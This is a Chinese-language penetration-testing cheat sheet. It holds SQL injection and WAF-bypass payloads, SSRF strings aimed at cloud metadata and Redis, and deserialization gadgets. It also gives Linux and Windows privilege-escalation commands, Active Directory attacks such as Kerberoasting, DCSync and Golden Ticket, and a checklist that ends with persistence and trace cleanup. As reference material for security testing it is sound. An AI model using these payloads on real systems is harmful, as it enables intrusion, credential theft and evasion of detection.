# ⚡ Security Researcher速查手册 (Quick Reference)

> _一页一个主题，可打印。最后更新：2026-05-14_

---

## 🎯 OWASP Top 10 (2021) 速查

| # | 风险 | 关键词 | 代表漏洞 |
|---|------|--------|----------|
| A01 | 失效的访问控制 | IDOR/BOLA/权限提升 | 水平越权/垂直越权 |
| A02 | 加密机制失效 | 弱算法/明文传输/密钥泄露 | TLS 降级/密码明文存储 |
| A03 | 注入 | SQLi/XSS/OS/LDAP/NoSQL | `1' OR 1=1--` / `<script>alert(1)</script>` |
| A04 | 不安全设计 | 业务逻辑缺陷/缺少威胁建模 | 竞争条件/批量枚举 |
| A05 | 安全配置错误 | 默认凭证/目录遍历/详细错误 | `.git` 泄露/调试端点 |
| A06 | 易受攻击和过时的组件 | CVE/未更新/已知漏洞 | Log4Shell/Spring4Shell |
| A07 | 身份和认证失效 | 弱密码/会话固定/暴力破解 | 凭证填充/Session 劫持 |
| A08 | 软件和数据完整性失败 | 不安全反序列化/供应链 | CI/CD 投毒/依赖混淆 |
| A09 | 安全日志和监控失效 | 缺少审计/告警盲区 | 攻击无感知 |
| A10 | SSRF | 服务端请求伪造 | `http://169.254.169.254/` |

---

## 💉 SQL 注入速查

```sql
-- 判断注入点
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--

-- 联合查询
' UNION SELECT 1,2,3--        -- 列数
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- 布尔盲注
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- 时间盲注
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--

-- WAF 绕过
uNiOn SeLeCt                    -- 大小写
UN/**/ION SEL/**/ECT             -- 注释
%55%4e%49%4f%4e                 -- URL 编码
/*!50000UNION*//*!50000SELECT*/ -- 内联注释
```

---

## 🔓 SSRF 速查

```
# 协议利用
file:///etc/passwd              -- 本地文件
http://169.254.169.254/         -- 云元数据
gopher://127.0.0.1:6379/_*      -- Redis 命令
dict://127.0.0.1:6379/          -- 服务探测

# 绕过技巧
0x7f000001                      -- IP 十六进制
http://evil@127.0.0.1           -- URL 解析差异
http://127.1                    -- 省略写法
http://[::1]                    -- IPv6
http://127.0.0.1.nip.io         -- DNS 重绑定
```

---

## 🏗️ 反序列化速查

```
# Java
ysoserial CommonsCollections1 "cmd" | base64
# Shiro: rememberMe cookie → AES-CBC 解密 → 反序列化
# Fastjson: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://..."}

# PHP
O:4:"User":1:{s:4:"name";s:5:"admin";}
phar://evil.phar                  -- Phar 反序列化

# Python
import pickle; pickle.dumps(obj) -- pickle.loads() = RCE
```

---

## 🐧 Linux 提权速查

```bash
# 信息收集
sudo -l                          -- 查看 sudo 权限
find / -perm -4000 2>/dev/null   -- SUID 文件
cat /etc/crontab                  -- 计划任务
uname -a                          -- 内核版本

# 内核漏洞提权
searchsploit linux kernel 4.x
# DirtyPipe (CVE-2022-0847): 内核 5.8-5.16.11
# DirtyCow (CVE-2016-5195): 内核 < 4.8.3

# SUID 提权
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/find -exec /bin/sh -p \;
# /usr/bin/vim -c ':!/bin/sh'
# /usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'

# 计划任务提权
cat /etc/crontab
ls -la /etc/cron.*
# 可写的 cron 脚本 → 写入反弹 shell

# sudo 提权
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
# sudo vim -c ':!/bin/sh'
```

---

## 🪟 Windows 提权速查

```powershell
# 信息收集
whoami /priv                      -- 特权枚举
systeminfo                        -- 补丁信息
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Potato 系列（SeImpersonatePrivilege）
PrintSpoofer.exe -c "cmd /c whoami"
JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
GodPotato.exe -cmd "cmd /c whoami"

# Token 模拟
# PrintSpoofer / JuicyPotato / GodPotato / SweetPotato

# DLL 劫持
# Process Monitor → 过滤 NAME NOT FOUND → 找可写目录

# UAC 绕过
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe
```

---

## 🏢 域渗透速查

```bash
# 信息收集
# BloodHound: bloodhound-python -u user -p pass -d domain -c All
# ldapsearch: ldapsearch -x -H ldap://dc -b "DC=domain,DC=com"

# Kerberoasting
# Rubeus: Rubeus.exe kerberoast
# impacket: GetUserSPNs.py domain/user:pass -dc-ip dc -request

# AS-REP Roasting
# Rubeus: Rubeus.exe asreproast
# impacket: GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip dc

# DCSync
# impacket: secretsdump.py domain/admin:pass@dc
# mimikatz: lsadump::dcsync /user:domain\krbtgt

# Golden Ticket
# mimikatz: kerberos::golden /user:admin /domain:domain /sid:S-1-5-... /krbtgt:hash /ptt

# ADCS (ESC1)
# Certify: Certify.exe find /vulnerable
# Certipy: certipy find -u user@domain -p pass -dc-ip dc -vulnerable
```

---

## 🕵️ 渗透测试检查清单

### 信息收集
- [ ] 子域名枚举（subfinder/amass）
- [ ] 端口扫描（nmap/masscan）
- [ ] Web 技术指纹（Wappalyzer）
- [ ] 目录扫描（ffuf/gobuster）
- [ ] GitHub 泄露搜索

### 漏洞发现
- [ ] SQL 注入测试
- [ ] XSS 测试（反射/存储/DOM）
- [ ] SSRF 测试
- [ ] 文件上传测试
- [ ] 反序列化测试
- [ ] 认证/授权测试
- [ ] 业务逻辑测试
- [ ] API 安全测试

### 后渗透
- [ ] 权限提升检查
- [ ] 横向移动路径
- [ ] 敏感数据发现
- [ ] 持久化验证
- [ ] 痕迹清理

---

_Security Researcher的速查手册，打印一份放桌上。🔒_
